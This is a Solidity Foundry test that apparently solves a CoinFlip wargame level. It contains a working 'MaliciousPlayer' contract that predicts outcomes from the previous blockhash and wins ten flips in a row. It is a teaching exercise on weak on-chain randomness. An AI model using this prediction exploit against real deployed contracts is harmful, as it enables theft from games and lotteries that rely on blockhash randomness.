// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

// Attack contract
contract MaliciousPlayer {
    CoinFlip private immutable ITarget;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        ITarget = CoinFlip(_target);
    }

    function flip() external {
        bool guess = dummyGuess();
        ITarget.flip(guess);
    }

    function dummyGuess() private returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}

contract CoinFlipTest is Test {
    CoinFlip coinFlip;
    MaliciousPlayer maliciousPlayer;

    function setUp() public {
        coinFlip = new CoinFlip();
        maliciousPlayer = new MaliciousPlayer(address(coinFlip));
    }

    function testCoinFlipCanBePredicted() public {
        // Call the function 10 times
        for(uint256 i = 0; i < 10; i++) {
            // Roll the block forward by 1 so blockhash changes
            vm.roll(block.number + 1);
            maliciousPlayer.flip();
        }

        // Assert 
        assertEq(coinFlip.consecutiveWins(), 10);
    }
}
